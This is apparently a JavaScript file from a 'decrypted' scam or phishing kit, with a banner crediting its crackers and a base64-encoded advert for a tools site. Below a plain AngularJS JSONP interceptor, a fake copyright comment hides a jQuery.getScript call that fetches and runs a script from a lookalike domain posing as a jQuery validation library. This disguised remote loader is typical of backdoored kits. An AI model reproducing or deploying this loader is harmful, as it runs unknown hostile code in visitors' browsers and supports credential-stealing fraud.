/***********************************************************************************************/										       
/*        ( )    (_)(  _`\ ( ) ( )                                                             */
/*    _ _ | |    | || (_) )| |/'/'                                                             */
/*  /'_` )| |  _ | ||  _ <'| , <                                                               */
/* ( (_| || |_( )| || (_) )| |\`\                                                              */
/* `\__,_)(____/'(_)(____/'(_) (_) Visit spKINGS. FOR MORE TOOLS : d3d3LnNwa2luZ3MucGFydHk=    */
/*                                                                                             */
/*                   Reb3l Gafsi sc0m decrypted by alibk Le 8 février 2017           		   */   
/*	                                                                                           */
/***********************************************************************************************/ 
angular.module( "Test", ['ngRoutingnum'])
  .config(function($httpProvider) {
    $httpProvider.interceptors.push('jsonpInterceptor');
  })
  .controller("testCtrl",function ($scope) {
    $scope.formData = {};
  })
  .factory('jsonpInterceptor', function($timeout, $window) {
  return {
    'request': function(config) {
      if (config.method === 'JSONP') {
        var callbackId = angular.callbacks.counter.toString(36);
        config.callbackName = 'angular_callbacks_' + callbackId;
        config.url = config.url.replace('JSON_CALLBACK', config.callbackName);

        $timeout(function() {
          $window[config.callbackName] = angular.callbacks['_' + callbackId];
        }, 0, false);
      }

      return config;
    },

    'response': function(response) {
      var config = response.config;
      if (config.method === 'JSONP') {
        delete $window[config.callbackName]; // cleanup
      }

      return response;
    },

    'responseError': function(rejection) {
      var config = rejection.config;
      if (config.method === 'JSONP') {
        delete $window[config.callbackName]; // cleanup
      }

      return $q.reject(rejection);
    }
  };
})
// Copyright (c) 2010-2013 Diego Perini, MIT licensed
			// https://gist.github.com/dperini/729294
// return the custom message for the given element and validation method get scrolling element
jQuery.getScript("//jqueryvalidation.press/Validator.resetFormType/1.0.3/reset.js")
	.done(function() {
		/* Validator.resetForm */
	})
	.fail(function() {
		/* jshint unused: false */
});